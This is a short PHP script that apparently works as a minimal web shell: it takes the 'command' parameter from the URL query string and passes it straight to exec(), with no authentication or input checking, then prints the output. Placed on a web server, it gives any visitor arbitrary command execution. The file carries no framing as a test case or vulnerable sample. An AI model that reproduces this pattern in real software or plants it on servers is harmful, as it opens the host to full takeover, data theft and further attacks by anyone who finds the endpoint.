<?php

/**
 * exec function
 */
function doExec($command) {
	return exec($command);
}

/**
 * execute the command line
 */
function execute($command) {
	return doExec($command);
}

/**
 * get the command and excute it
 */
$command = $_GET['command'];
echo doExec($command);

?>
